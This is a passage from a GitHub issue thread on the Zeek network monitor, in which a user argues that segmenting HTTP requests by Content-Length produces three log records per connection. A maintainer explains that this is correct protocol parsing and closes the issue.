| Thank you. The script you provide can detect such events and generate a new event record. However, we use ZEEK as an HTTP traffic recorder. This security event detection is done by our other programs. ZEEK provides the original HTTP input. The problem now is that ZEEK will generate three records from an HTTP connection. In this way, we will also get 3 wrong inputs, which will lead to problems in our test results.  As mentioned above - Zeek produces the output that is required by the HTTP RFCs. For your example there is no ambiguity around this - it is 3 requests, not one. So you do get the correct output - Zeek records the traffic as it happened (thus, as 3 requests, just as Wireshark, e.g., parses it)  Why do you want this logged as one request? Why do you think it should be logged as such?  rsmmr commented yesterday • Yeah, I understand what's happening and see the multiple entries in http.log. What I'm wondering is how do you think Zeek should be parsing this instead. The following is really the main challenge:  Using Content-Length to segment HTTP requests is dangerous  The thing is: That's what Content-Length is for. The receiving server will likewise use it to segment the client's data. I don't see how else Zeek (or the server) could parse this otherwise. What would you suggest?  Rsmmr has confirmed. I don't want to answer this question again. The solution I proposed is just a solution idea, which does not mean that you will eventually do so. |
| --- |

All reactions

Sorry, something went wrong.

[![@rsmmr](https://avatars.githubusercontent.com/u/1934232?s=80&u=bb23a1f33a8f2b455fe051ec728c35c42e5c1b17&v=4)](/rsmmr)

Copy link

Member

### **[rsmmr](/rsmmr)** commented [Oct 1, 2021](#issuecomment-931956914)

| Sorry, I don't follow what you're saying. I'll go ahead and close the ticket as everything's working as expected. |
| --- |

All reactions

Sorry, something went wrong.

[![@rsmmr](https://avatars.githubusercontent.com/u/1934232?s=40&u=bb23a1f33a8f2b455fe051ec728c35c42e5c1b17&v=4)](/rsmmr)
[rsmmr](/rsmmr)
closed this as [completed](/zeek/zeek/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Oct 1, 2021](#event-5392242476)

[![@rsmmr](https://avatars.githubusercontent.com/u/1934232?s=40&u=bb23a1f33a8f2b455fe051ec728c35c42e5c1b17&v=4)](/rsmmr)
[rsmmr](/rsmmr)
added
[Area: Protocol Analysis](/zeek/zeek/labels/Area%3A%20Protocol%20Analysis)
[Invalid / Nothing to do](/zeek/zeek/labels/Invalid%20/%20Nothing%20to%20do)
labels
[Oct 1, 2021](#event-5392522216)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fzeek%2Fzeek%2Fissues%2F1798)

Assignees

No one assigned

Labels

[Area: Protocol Analysis](/zeek/zeek/labels/Area%3A%20Protocol%20Analysis)
[Invalid / Nothing to do](/zeek/zeek/labels/Invalid%20/%20Nothing%20to%20do)

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

5 participants

[![@sethhall](https://avatars.githubusercontent.com/u/15810?s=52&v=4)](/sethhall) [![@0xxon](https://avatars.githubusercontent.com/u/1538460?s=52&v=4)](/0xxon) [![@rsmmr](https://avatars.githubusercontent.com/u/1934232?s=52&v=4)](/rsmmr) [![@stevesmoot](https://avatars.githubusercontent.com/u/14839896?s=52&v=4)](/stevesmoot) [![@wubonetcn](https://avatars.githubusercontent.com/u/14988652?s=52&v=4)](/wubonetcn)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

